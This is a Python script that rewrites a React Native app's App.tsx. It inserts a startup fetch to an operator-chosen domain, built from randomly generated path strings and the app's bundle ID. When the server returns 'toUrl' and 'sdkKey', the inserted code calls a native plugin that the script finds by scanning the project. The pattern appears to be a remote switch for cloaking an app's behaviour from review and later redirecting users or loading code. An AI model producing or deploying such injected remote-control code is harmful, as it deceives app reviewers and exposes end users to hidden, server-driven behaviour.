#!/usr/bin/env python3
# upgrade_rn_dex.py - 简化版本，仅用于更新App.tsx文件
import re
import random
import string
from pathlib import Path

def get_user_inputs():
    """获取用户输入信息"""
    print("=== RN+Dex App.tsx 更新脚本 ===")
    
    # 获取RN项目路径
    project_path = input("请输入RN项目路径: ").strip()
    while not project_path or not Path(project_path).exists():
        print("❌ 项目路径不存在，请重新输入！")
        project_path = input("请输入RN项目路径: ").strip()
    
    # 获取API接口域名
    api_domain = input("请输入API接口域名 (如: www.skidu.xyz): ").strip()
    while not api_domain:
        print("❌ API接口域名不能为空，请重新输入！")
        api_domain = input("请输入API接口域名 (如: www.skidu.xyz): ").strip()
    
    # 获取URL路径参数
    first_path = input("请输入第一个随机路径字符串 (6-8位，以字母d结尾，回车自动生成): ").strip()
    
    # 如果用户未输入，则自动生成
    if not first_path:
        first_path = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 7))) + 'd'
        print(f"自动生成第一个路径字符串: {first_path}")
    elif not re.match(r'^[a-zA-Z0-9]{5,7}[a-zA-Z]d$', first_path):
        print("❌ 格式错误，请输入6-8位且以字母d结尾的字符串！")
        return get_user_inputs()  # 重新输入
    
    second_path = input("请输入第二个随机路径字符串 (6-8位，回车自动生成): ").strip()
    
    # 如果用户未输入，则自动生成
    if not second_path:
        second_path = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 8)))
        print(f"自动生成第二个路径字符串: {second_path}")
    elif not re.match(r'^[a-zA-Z0-9]{6,8}$', second_path):
        print("❌ 格式错误，请输入6-8位的字符串！")
        return get_user_inputs()  # 重新输入
    
    return {
        "project_path": project_path,
        "api_domain": api_domain,
        "first_path": first_path,
        "second_path": second_path
    }

def find_actual_plugin_info(project_path: str) -> tuple:
    """查找实际的插件类名和方法名"""
    print("\n🔍 查找实际的插件信息...")
    project = Path(project_path)
    
    # 查找MainApplication.kt文件
    main_app_path = None
    for path in project.rglob("MainApplication.kt"):
        main_app_path = path
        print(f"🔍 找到MainApplication.kt文件: {path}")
        break
    
    if not main_app_path or not main_app_path.exists():
        print("⚠️ 未找到MainApplication.kt文件")
        return None, None
    
    try:
        # 读取MainApplication.kt文件
        main_app_content = main_app_path.read_text(encoding='utf-8')
        
        # 查找插件包注册代码，提取包名
        package_match = re.search(r'add\(([A-Za-z0-9_]+)Package\(\)', main_app_content)
        if not package_match:
            print("⚠️ 未找到插件包注册代码")
            return None, None

        package_name = package_match.group(1)
        print(f"🔍 找到插件包名: {package_name}")

        # 在项目中查找继承ReactContextBaseJavaModule的类
        module_name = None
        method_name = None

        # 查找Java文件
        for java_file in project.rglob("*.java"):
            try:
                java_content = java_file.read_text(encoding='utf-8')
                # 检查是否继承了ReactContextBaseJavaModule
                if f'extends ReactContextBaseJavaModule' in java_content and package_name in java_content:
                    # 提取类名
                    class_match = re.search(r'class\s+([A-Za-z0-9_]+)', java_content)
                    if class_match:
                        module_name = class_match.group(1)
                        print(f"🔍 找到插件类: {module_name}")

                        # 查找@ReactMethod修饰的方法
                        method_match = re.search(r'@ReactMethod\s+public\s+void\s+([A-Za-z0-9_]+)', java_content)
                        if method_match:
                            method_name = method_match.group(1)
                            print(f"🔍 找到插件方法: {method_name}")
                            break
            except Exception as e:
                continue  # 跳过无法读取的文件

        if module_name and method_name:
            return module_name, method_name
        else:
            print("⚠️ 未找到完整的插件信息")
            return None, None
    except Exception as e:
        print(f"❌ 查找插件信息失败: {e}")
        return None, None

def update_app_tsx(project_path: str, api_domain: str, first_path: str, second_path: str) -> bool:
    """更新App.tsx文件，添加动态控制接口代码"""
    print("\n📝 更新App.tsx文件...")
    project = Path(project_path)
    app_tsx_path = project / "App.tsx"
    
    # 检查App.tsx是否存在
    if not app_tsx_path.exists():
        print("❌ 未找到App.tsx文件")
        return False
    
    try:
        # 读取App.tsx内容
        # 首先尝试UTF-8编码，如果失败则尝试其他编码
        try:
            content = app_tsx_path.read_text(encoding='utf-8')
        except UnicodeDecodeError:
            # 如果UTF-8失败，尝试使用系统默认编码
            content = app_tsx_path.read_text()
        
        # 检查是否已经添加过相关代码
        if 'DeviceInfo' in content and 'fetch(' in content:
            print("✅ App.tsx已包含相关代码，无需重复添加")
            return True
        
        # 动态查找实际的插件类名和方法名
        module_name, method_name = find_actual_plugin_info(project_path)
        if not module_name or not method_name:
            print("⚠️ 未找到实际的插件信息，使用默认值: EventModule.jumpEvent")
            module_name = "EventModule"
            method_name = "jumpEvent"

        # 添加导入语句（在文件开头附近添加）
        import_pos = content.find("import")
        if import_pos == -1:
            import_pos = 0
        
        # 还需要引入这个，动态获取当前app的包名
        import_code = f"import DeviceInfo from 'react-native-device-info';\nimport {{ NativeModules }} from 'react-native';\nconst {{ {module_name} }} = NativeModules;\n"
        updated_content = content[:import_pos] + import_code + content[import_pos:]
        
        # 添加变量声明和useEffect代码（在组件函数中添加）
        # 查找函数组件的位置
        component_pos = updated_content.find("function App()")
        if component_pos == -1:
            component_pos = updated_content.find("const App")
        
        if component_pos != -1:
            # 查找组件主体的开始和结束位置
            body_start = updated_content.find("{", component_pos)
            if body_start != -1:
                # 查找组件主体的结束位置（匹配的右大括号）
                brace_count = 1
                body_end = body_start + 1
                while brace_count > 0 and body_end < len(updated_content):
                    if updated_content[body_end] == '{':
                        brace_count += 1
                    elif updated_content[body_end] == '}':
                        brace_count -= 1
                    body_end += 1

                # 构建新的useEffect代码
                new_effect_code = f"\n  //声明一个变量 获取appID\n  let appId = DeviceInfo.getBundleId();\n\n  //更新useEffect方法\n  useEffect(() => {{\n    console.log('初始化');\n    //这里的url 需要手动输入 这部分：{api_domain}\n    //这里的完整url 应该需要动态生成，有规则 https:// + url+\"/\"+{first_path}+ \"/\" + 包名+ \"/\" + {second_path}\n    fetch(`https://{api_domain}/{first_path}/${{appId}}/{second_path}`)\n      .then(response => response.json())\n      .then(data => {{\n        if (data && data.toUrl && data.sdkKey) {{\n          //这里时自定义的插件调用方式，一定要和插件同步\n          {module_name}.{method_name}(data.toUrl, data.sdkKey);\n          setTimeout(() => {{}}, 3000);\n        }}\n        console.log(data);\n      }});\n  }}, []);\n"

                # 提取组件主体内容
                component_body = updated_content[body_start:body_end]

                # 检查是否已存在useEffect方法
                if "useEffect" in component_body:
                    # 查找useEffect方法的开始位置
                    effect_start = component_body.find("useEffect(() => {")
                    if effect_start != -1:
                        # 查找useEffect方法的结束位置
                        effect_end = effect_start
                        brace_count = 1
                        while brace_count > 0 and effect_end < len(component_body):
                            effect_end += 1
                            if effect_end < len(component_body):
                                if component_body[effect_end] == '{':
                                    brace_count += 1
                                elif component_body[effect_end] == '}':
                                    brace_count -= 1

                        # 确保找到完整的useEffect方法
                        if brace_count == 0:
                            # 查找依赖数组结束位置
                            dep_end = component_body.find("]);", effect_end)
                            if dep_end != -1:
                                dep_end += 2  # 包含”]);

                                # 替换useEffect方法
                                old_effect = component_body[effect_start:dep_end]
                                component_body = component_body.replace(old_effect, new_effect_code.strip())
                                print("🔄 替换了已存在的useEffect方法")
                            else:
                                # 如果找不到依赖数组结束位置，在组件主体开始后添加新的useEffect
                                component_body = component_body[:1] + new_effect_code + component_body[1:]
                        else:
                            # 如果找不到完整的useEffect方法，在组件主体开始后添加新的useEffect
                            component_body = component_body[:1] + new_effect_code + component_body[1:]
                    else:
                        # 如果找不到useEffect方法，在组件主体开始后添加新的useEffect
                        component_body = component_body[:1] + new_effect_code + component_body[1:]
                else:
                    # 如果不存在useEffect方法，添加新的useEffect方法
                    component_body = component_body[:1] + new_effect_code + component_body[1:]

                # 更新整个内容
                updated_content = updated_content[:body_start] + component_body + updated_content[body_end:]

        # 写入更新后的内容
        # 使用UTF-8编码写入文件
        try:
            app_tsx_path.write_text(updated_content, encoding='utf-8')
        except UnicodeEncodeError:
            # 如果UTF-8失败，使用系统默认编码
            app_tsx_path.write_text(updated_content)
        print("✅ App.tsx更新完成")
        return True
    except Exception as e:
        print(f"❌ App.tsx更新失败: {e}")
        return False

def main():
    """主函数"""
    print("🚀 开始更新App.tsx文件")
    
    # 获取用户输入
    user_inputs = get_user_inputs()
    
    # 更新App.tsx
    if not update_app_tsx(user_inputs["project_path"], user_inputs["api_domain"],
                         user_inputs["first_path"], user_inputs["second_path"]):
        return
    
    # 完成
    print("\n🎉 App.tsx更新完成！")

if __name__ == "__main__":
    main()